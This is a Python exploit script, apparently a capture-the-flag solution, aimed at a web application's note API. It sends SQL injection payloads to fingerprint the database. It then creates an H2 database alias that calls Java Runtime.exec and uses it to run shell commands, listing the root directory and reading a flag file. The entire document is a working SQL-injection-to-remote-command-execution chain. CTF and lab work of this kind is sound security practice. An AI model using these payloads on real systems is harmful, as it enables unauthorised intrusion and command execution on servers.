import requests

target_url = "http://<IP>:<PORT>/api/note"
cookies = {"JSESSIONID": "<XXX>"}

# Helper to send the injection payload
def send_payload(payload):
    multipart_data = {
        'name': (None, payload)
    }
    resp = requests.post(target_url, files=multipart_data, cookies=cookies)
    try:
        return resp.json()
    except ValueError:
        # Return raw text if JSON parsing fails
        return resp.text

# Autodetection of DB type

def detect_db():
    fingerprints = {
        "mysql": "a' UNION SELECT @@version,2,3-- -",
        "postgres": "a' UNION SELECT version(),2,3-- -",
        "mssql": "a' UNION SELECT @@version,2,3-- -",
        "h2": "a' UNION SELECT H2VERSION(),2,3-- -",
        "oracle": "a' UNION SELECT banner,2,3 FROM v$version-- -",
    }

    for db_name, payload in fingerprints.items():
        resp = send_payload(payload)
        print(f"[DEBUG] {db_name} response: {resp}")  # <-- See what comes back here
        data = str(resp)
        if any(keyword in data for keyword in ["MySQL", "mysql"]):
            return "mysql"
        if "PostgreSQL" in data:
            return "postgres"
        if "Microsoft SQL" in data:
            return "mssql"
        if "H2" in data:
            return "h2"
        if "Oracle" in data:
            return "oracle"
    return None
db_type = detect_db()
if db_type:
    print(f"[+] Database detected: {db_type}")
else:
    print("[-] Could not detect database type")

# Step 1: test injection
print("[*] Testing injectionable\n")
test_payload = "a' UNION SELECT 1,2,3-- -"
print(send_payload(test_payload))
print("\n")
# Step 2: create alias
alias = (
    "a'; CREATE ALIAS EXEC_OS_COMMAND AS 'String exec(String cmd) throws Exception { "
    "Process process = Runtime.getRuntime().exec(cmd); "
    "java.util.Scanner scanner = new java.util.Scanner(process.getInputStream()).useDelimiter(\"\\\\A\"); "
    "return scanner.hasNext() ? scanner.next() : \"\"; }'-- -"
)
print("[*] Just created an alias for H2 database\n")
print(send_payload(alias))
print("\n")

# Step 3: test command execution
print("[*] Testing the alias cmd\n")
cmd_test_payload = "a' UNION SELECT 1,'flag',EXEC_OS_COMMAND('whoami')-- -"
print(send_payload(cmd_test_payload))
print("\n")
# Step 4 and 5: enumerate and cat flag
# Step 4: find possible flag file paths
# List files in root and look for *_flag.txt
# List files in root
list_root_payload = "a' UNION SELECT 1,'flag',EXEC_OS_COMMAND('ls /')-- -"
root_listing = send_payload(list_root_payload)
print("Root listing:", root_listing)
print("\n")

if root_listing and isinstance(root_listing, list):
    files = root_listing[0].get("Note", "").split("\n")
    # Match any filename containing 'flag' (case-insensitive) and ending in .txt
    flag_file = next((f for f in files if "flag" in f.lower() and f.endswith(".txt")), None)
    if flag_file:
        cat_payload = f"a' UNION SELECT 1,'flag',EXEC_OS_COMMAND('cat /{flag_file}')-- -"
        print("Flag:", send_payload(cat_payload))
    else:
        print("No flag file found in /")


# Repeat sending commands to find files and read flag, parse output accordingly
